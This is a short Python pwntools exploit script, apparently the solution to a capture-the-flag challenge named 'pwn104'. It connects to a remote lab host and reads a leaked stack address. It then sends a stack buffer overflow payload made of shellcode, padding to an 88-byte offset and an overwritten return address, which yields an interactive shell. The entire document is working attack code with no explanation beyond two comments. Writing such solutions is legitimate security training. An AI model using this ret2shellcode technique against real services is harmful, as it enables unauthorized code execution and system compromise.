#!/usr/bin/env python3
# ret2shellcode, we have to point return address to our shellcode location.



from pwn import *

host = "10.10.201.237"
port = 9004

context.log_level = 'warning'
context.arch = 'amd64' # Make sure to add this one, without this your program will crash

binary = ELF("./pwn104")
#p = process("./pwn104")
p = remote(host,port)


p.recvuntil(b"I'm waiting for you at")
leak = p.recvline().decode().strip()
ret_addr = int(leak, 16)

log.info(f"[+] Leak Address: {hex(ret_addr)}")


offset = 88
shellcode = asm(shellcraft.sh())
padding = b'A' * (offset - len(shellcode))

payload = flat([
    shellcode,
    padding,
    p64(ret_addr)
])

p.sendline(payload)
p.interactive()